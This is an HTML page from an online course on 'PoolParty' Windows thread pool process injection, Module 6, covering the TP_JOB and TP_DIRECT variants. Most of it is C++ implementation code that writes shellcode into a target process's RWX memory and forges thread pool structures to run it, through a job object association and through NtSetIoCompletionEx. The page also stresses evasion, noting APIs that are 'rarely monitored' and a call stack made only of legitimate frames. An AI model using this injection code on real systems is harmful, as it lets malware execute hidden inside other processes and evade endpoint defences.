@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: Job &amp; Direct Variants - PoolParty Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F3CA;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#f59e0b;--accent2:#d97706;--gradient:linear-gradient(135deg,#f59e0b,#d97706)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>PoolParty Course</h2>
+<span>Thread Pool Injection Masterclass</span>
+</div>
+<a class="home-link" href="../PoolParty_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Process Injection Landscape</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Thread Pool Architecture</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Thread Pool Internals</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Worker Factory &amp; TP_WORK</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Wait, I/O &amp; ALPC</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module6.html"><span>6. Job &amp; Direct Variants</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. TP_TIMER Insertion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 6: Job &amp; Direct Variants</h1>
+<p class="subtitle">PoolParty Variants 6&ndash;7: TP_JOB insertion for job notification callback triggering and TP_DIRECT fast-path insertion via NtSetIoCompletionEx.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how PoolParty Variant 6 exploits Windows Job Objects bound to the thread pool by inserting a TP_JOB item that triggers a callback when a job notification arrives, and how Variant 7 uses the TP_DIRECT fast-path mechanism to achieve the most streamlined code execution via <code>NtSetIoCompletionEx</code>.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Job Objects and the Thread Pool</h2>
+
+<p>Windows Job Objects are kernel objects used to manage groups of processes. A job object can be associated with the thread pool so that job notifications (such as process creation, process exit, or resource limit violations within the job) are dispatched as callbacks on worker threads.</p>
+
+<table>
+<tr><th>Component</th><th>Description</th></tr>
+<tr><td><strong>Job Object</strong></td><td>Kernel object that groups processes for management and resource control</td></tr>
+<tr><td><strong>TP_JOB</strong></td><td>Thread pool structure binding a job object to a callback</td></tr>
+<tr><td><strong>Job Notifications</strong></td><td>Events like process creation/exit within the job that trigger callbacks</td></tr>
+<tr><td><strong>IOCP Binding</strong></td><td>Job notifications are delivered via the pool&rsquo;s IOCP, same as all other callback types</td></tr>
+</table>
+
+<h3>1.1 How Job Objects Bind to the Thread Pool</h3>
+
+<p>When a process associates a job object with its thread pool, the job object is linked to the pool&rsquo;s IOCP via <code>SetInformationJobObject</code> with the <code>JobObjectAssociateCompletionPortInformation</code> class. Job events then post completion packets to the IOCP, and the worker threads dispatch the TP_JOB callback.</p>
+
+<pre><span class="lang-tag">C++ (Internal Mechanism)</span><code>// Job object association with thread pool IOCP
+typedef struct _JOBOBJECT_ASSOCIATE_COMPLETION_PORT {
+    PVOID  CompletionKey;    // Encodes the TP_JOB pointer
+    HANDLE CompletionPort;   // The pool's IOCP
+} JOBOBJECT_ASSOCIATE_COMPLETION_PORT;
+
+// When a job notification occurs (process exit, limit violation, etc.),
+// the kernel posts a completion packet to the IOCP:
+// CompletionKey = TP_JOB pointer
+// The worker thread dispatches the TP_JOB callback</code></pre>
+
+<!-- ============================================================ -->
+<h2>2. Variant 6: TP_JOB Insertion</h2>
+
+<p>Variant 6 inserts a crafted TP_JOB structure into the target process, associating it with a job object whose notifications will be delivered to the pool&rsquo;s IOCP. When a job notification fires, the callback &mdash; now pointing to shellcode &mdash; executes on a worker thread.</p>
+
+<div class="diagram">
+<h4>Variant 6 Attack Flow</h4>
+<div class="flow">
+<div class="flow box">Write shellcode<br><small>+ craft TP_JOB</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Associate job<br><small>with pool IOCP</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box y">Trigger notification<br><small>Job event fires</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Callback fires<br><small>Shellcode runs</small></div>
+</div>
+</div>
+
+<h3>2.1 Implementation</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Variant 6: TP_JOB Insertion
+
+// Step 1: Allocate and write shellcode in target
+LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL,
+    shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hProcess, remoteShellcode, shellcode,
+                   shellcodeSize, NULL);
+
+// Step 2: Craft a TP_JOB structure in the target process
+// The callback points to our shellcode
+TP_JOB fakeJob = { 0 };
+fakeJob.Task.WorkCallback = (PTP_WORK_CALLBACK)remoteShellcode;
+fakeJob.Task.Context = NULL;
+fakeJob.Pool = (PTP_POOL)targetPoolPtr;
+
+LPVOID remoteJob = VirtualAllocEx(hProcess, NULL,
+    sizeof(TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(hProcess, remoteJob, &fakeJob,
+                   sizeof(TP_JOB), NULL);
+
+// Step 3: Associate the job object with the target's IOCP
+// using the TP_JOB pointer as the CompletionKey
+JOBOBJECT_ASSOCIATE_COMPLETION_PORT jobAssoc;
+jobAssoc.CompletionKey = (PVOID)remoteJob;
+jobAssoc.CompletionPort = targetIocpHandle;
+
+SetInformationJobObject(hJob,
+    JobObjectAssociateCompletionPortInformation,
+    &jobAssoc, sizeof(jobAssoc));
+
+// Step 4: Trigger a job notification
+// Assigning a process to the job or causing a job event
+// will post a completion packet to the IOCP
+AssignProcessToJobObject(hJob, hTargetProcess);
+
+// The job notification causes the kernel to post a
+// completion packet to the pool's IOCP with our TP_JOB
+// as the CompletionKey, triggering our shellcode callback</code></pre>
+
+<div class="card warn">
+<h4>Variant 6 Requirements</h4>
+<p>Variant 6 requires the ability to create or access a job object and associate it with the target process&rsquo;s IOCP. Not all processes are already part of a job, but the attacker can create a new job object and associate it with the pool&rsquo;s IOCP using a duplicated handle, then trigger a notification event.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. What Is TP_DIRECT?</h2>
+
+<p>In addition to the standard callback types (TP_WORK, TP_WAIT, TP_IO, TP_ALPC, TP_JOB), the Windows thread pool has an internal <strong>fast-path mechanism</strong> called <code>TP_DIRECT</code>. Unlike the other types, TP_DIRECT items bypass the standard task queue and are dispatched directly from the I/O completion packet.</p>
+
+<div class="card green">
+<h4>Why TP_DIRECT Matters</h4>
+<p>TP_DIRECT is the <strong>simplest possible callback structure</strong> in the thread pool. It requires only a callback function pointer and is dispatched immediately when the corresponding IOCP packet arrives. There is no queue manipulation, no list insertion, no timer management &mdash; just a function pointer that gets called. This makes it the ideal injection target.</p>
+</div>
+
+<h3>3.1 TP_DIRECT Structure</h3>
+
+<pre><span class="lang-tag">C++ (Reconstructed)</span><code>// TP_DIRECT - minimal callback structure
+struct TP_DIRECT {
+    PTP_SIMPLE_CALLBACK Callback;  // Function pointer to execute
+    // Embedded in the completion packet's overlapped field
+    // No pool linkage, no queue, no complex metadata
+};
+
+// The callback signature for TP_DIRECT:
+typedef VOID (CALLBACK *PTP_SIMPLE_CALLBACK)(
+    PTP_CALLBACK_INSTANCE Instance,
+    PVOID                 Context
+);</code></pre>
+
+<h3>3.2 TP_DIRECT Dispatch in TppWorkerThread</h3>
+
+<pre><span class="lang-tag">C++ (Pseudocode)</span><code>// Inside TppWorkerThread main loop (simplified)
+VOID TppWorkerThread(PTP_POOL Pool)
+{
+    while (TRUE)
+    {
+        ULONG_PTR completionKey;
+        PVOID     overlapped;
+        IO_STATUS_BLOCK iosb;
+
+        NtRemoveIoCompletion(Pool->CompletionPort,
+            &completionKey, &overlapped, &iosb, NULL);
+
+        // Check if this is a TP_DIRECT item
+        if (IsDirectItem(completionKey, overlapped))
+        {
+            // Fast path: call the TP_DIRECT callback directly
+            PTP_DIRECT direct = (PTP_DIRECT)overlapped;
+            TppDirectpExecuteCallback(direct);
+        }
+        else
+        {
+            // Standard path: decode and dispatch through task queue
+            TppWorkpExecuteCallback(...);
+        }
+    }
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>4. Variant 7: TP_DIRECT Insertion</h2>
+
+<p>Variant 7 is one of the most streamlined PoolParty variants. The attack flow is minimal:</p>
+
+<div class="diagram">
+<h4>Variant 7 Attack Flow</h4>
+<div class="flow">
+<div class="flow box">Write shellcode<br><small>VirtualAllocEx</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Craft TP_DIRECT<br><small>Callback = shellcode</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Post to IOCP<br><small>NtSetIoCompletionEx</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Shellcode fires<br><small>Direct dispatch</small></div>
+</div>
+</div>
+
+<h3>4.1 Full Implementation</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Variant 7: TP_DIRECT Insertion - Complete Implementation
+
+// Step 1: Open target process
+HANDLE hProcess = OpenProcess(
+    PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
+    PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
+    FALSE, targetPid);
+
+// Step 2: Locate the target's thread pool IOCP
+HANDLE targetIocp = FindThreadPoolIocp(hProcess, targetPid);
+
+// Step 3: Allocate and write shellcode in target
+LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL,
+    shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hProcess, remoteShellcode, shellcode,
+                   shellcodeSize, NULL);
+
+// Step 4: Craft a TP_DIRECT structure in target memory
+TP_DIRECT directItem = { 0 };
+directItem.Callback = (PTP_SIMPLE_CALLBACK)remoteShellcode;
+
+LPVOID remoteDirect = VirtualAllocEx(hProcess, NULL,
+    sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(hProcess, remoteDirect, &directItem,
+                   sizeof(TP_DIRECT), NULL);
+
+// Step 5: Duplicate the IOCP handle
+HANDLE localIocp;
+DuplicateHandle(hProcess, targetIocp,
+                GetCurrentProcess(), &localIocp,
+                0, FALSE, DUPLICATE_SAME_ACCESS);
+
+// Step 6: Post the TP_DIRECT to the IOCP
+NtSetIoCompletionEx(
+    localIocp,                // Target's IOCP (duplicated)
+    localIocp,                // Reservation port (same IOCP)
+    (PVOID)remoteDirect,      // ApcContext = TP_DIRECT in target
+    STATUS_SUCCESS,
+    0,
+    FALSE
+);
+
+// Worker thread wakes, identifies TP_DIRECT marker,
+// calls directItem.Callback = our shellcode
+// Clean call stack through TppDirectpExecuteCallback</code></pre>
+
+<h3>4.2 NtSetIoCompletionEx vs NtSetIoCompletion</h3>
+
+<table>
+<tr><th>Feature</th><th>NtSetIoCompletion</th><th>NtSetIoCompletionEx</th></tr>
+<tr><td><strong>Basic posting</strong></td><td>Yes</td><td>Yes</td></tr>
+<tr><td><strong>Reservation support</strong></td><td>No</td><td>Yes &mdash; guarantees packet delivery</td></tr>
+<tr><td><strong>Used by</strong></td><td>General IOCP posting</td><td>Thread pool internal TP_DIRECT path</td></tr>
+<tr><td><strong>Monitoring</strong></td><td>Rarely monitored</td><td>Even more rarely monitored</td></tr>
+</table>
+
+<div class="card green">
+<h4>Why Variant 7 Is Particularly Elegant</h4>
+<ul>
+<li><strong>No queue manipulation</strong> &mdash; unlike Variants 2&ndash;3, no linked list modifications in target memory</li>
+<li><strong>No thread creation</strong> &mdash; unlike Variant 1, no new threads spawned</li>
+<li><strong>No IPC connection</strong> &mdash; unlike Variant 5 (ALPC), no IPC channel needed</li>
+<li><strong>Simplest structure</strong> &mdash; TP_DIRECT is just a function pointer, not a complex multi-field structure</li>
+<li><strong>Direct dispatch</strong> &mdash; bypasses the standard task queue entirely, taking the fastest code path</li>
+<li><strong>Self-contained</strong> &mdash; only needs the IOCP handle and a shellcode allocation</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Comparison: Variants 6 and 7</h2>
+
+<table>
+<tr><th>Property</th><th>Variant 6 (TP_JOB)</th><th>Variant 7 (TP_DIRECT)</th></tr>
+<tr><td><strong>Trigger</strong></td><td>Job notification event</td><td>Post IOCP completion packet</td></tr>
+<tr><td><strong>Key API</strong></td><td><code>SetInformationJobObject</code></td><td><code>NtSetIoCompletionEx</code></td></tr>
+<tr><td><strong>Prerequisite</strong></td><td>Job object + IOCP handle</td><td>IOCP handle only</td></tr>
+<tr><td><strong>Structure complexity</strong></td><td>TP_JOB with job association</td><td>Minimal &mdash; single function pointer</td></tr>
+<tr><td><strong>Applicability</strong></td><td>Any process with a thread pool</td><td>Any process with a thread pool</td></tr>
+<tr><td><strong>Dispatch path</strong></td><td>Job notification &rarr; IOCP &rarr; worker</td><td>Direct IOCP fast-path &rarr; worker</td></tr>
+<tr><td><strong>Stealth</strong></td><td>Job notifications are legitimate OS operations</td><td>NtSetIoCompletionEx is rarely monitored</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>6. Call Stack Analysis</h2>
+
+<p>When Variant 7&rsquo;s shellcode executes, the call stack traces back through the legitimate TP_DIRECT dispatch path:</p>
+
+<pre><span class="lang-tag">Call Stack</span><code>shellcode+0x0                           ; Our injected code
+ntdll!TppDirectpExecuteCallback+0x50    ; TP_DIRECT dispatch
+ntdll!TppWorkerThread+0x3a2             ; Worker main loop
+kernel32!BaseThreadInitThunk+0x14       ; Thread start
+ntdll!RtlUserThreadStart+0x21          ; Thread entry</code></pre>
+
+<p>Every frame in this stack is a legitimate system function. There is no <code>CreateRemoteThread</code>, no <code>QueueUserAPC</code>, no <code>SetThreadContext</code> &mdash; just standard thread pool infrastructure executing what it believes is a normal TP_DIRECT callback.</p>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="C">
+<p>Q1: What mechanism does Variant 6 (TP_JOB) use to trigger callback execution?</p>
+<div class="quiz-btn" data-choice="A">A) Creating a remote thread</div>
+<div class="quiz-btn" data-choice="B">B) Signaling an event object</div>
+<div class="quiz-btn" data-choice="C">C) Job object notifications posted to the pool's IOCP</div>
+<div class="quiz-btn" data-choice="D">D) Sending an ALPC message</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q2: What makes TP_DIRECT different from TP_WORK, TP_TIMER, and other thread pool types?</p>
+<div class="quiz-btn" data-choice="A">A) It runs in kernel mode</div>
+<div class="quiz-btn" data-choice="B">B) It bypasses the task queue and is dispatched directly from the IOCP completion packet</div>
+<div class="quiz-btn" data-choice="C">C) It requires administrator privileges</div>
+<div class="quiz-btn" data-choice="D">D) It can only execute signed code</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q3: What is the role of NtSetIoCompletionEx in Variant 7?</p>
+<div class="quiz-btn" data-choice="A">A) It creates a new IOCP in the target process</div>
+<div class="quiz-btn" data-choice="B">B) It modifies the worker factory StartRoutine</div>
+<div class="quiz-btn" data-choice="C">C) It posts the TP_DIRECT completion packet to the target's IOCP, triggering callback dispatch</div>
+<div class="quiz-btn" data-choice="D">D) It signals an event object in the target</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module5.html">&larr; Prev: Wait, I/O &amp; ALPC</a>
+<a class="primary" href="module7.html">Next: TP_TIMER Insertion &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
